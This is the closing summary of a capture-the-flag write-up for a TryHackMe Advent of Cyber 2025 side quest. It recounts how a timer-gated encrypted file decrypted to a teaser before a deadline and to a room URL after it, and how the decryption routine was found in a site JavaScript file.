1. **Timer-Based Content:** The encrypted file changed after the countdown timer expired (December 5, 2025, 18:00 UTC)
2. **Before Timer:** Ciphertext decrypted to "It isn't time yet. When the time is right, Hopper welcomes you to learn more..."
3. **After Timer:** Ciphertext contained the actual room URL
4. **JavaScript Analysis:** Found the exact decryption algorithm by downloading `/apps/hoppers-invitation/assets/index-C4-4uPfO.js`

---

*Writeup by Mr. Umair | TryHackMe Advent of Cyber 2025 Side Quest*

